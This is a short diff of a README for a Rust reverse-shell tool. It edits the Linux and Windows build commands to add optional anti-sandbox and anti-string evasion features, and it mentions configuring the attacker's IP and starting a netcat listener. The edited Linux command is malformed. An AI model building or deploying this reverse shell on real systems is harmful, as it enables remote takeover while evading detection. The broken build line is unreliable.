@@ -20,12 +20,12 @@ and change the IP address and port to match the IP address of your attacking mac
 
     #### For Linux targets
     ```commandline
-    cargo build -p tcp_reverse_shell --release
+    cargo build -p tcp_reverse_shell [antisand][,][antistring]] --release
     ```
 
     #### For Windows targets
     ```commandline
-    cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell --release
+    cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell [--features [antisand][,][antistring]] --release
     ```
 3. Start a netcat listener on the attacking machine on the same port you configured in step 1
     ```commandline
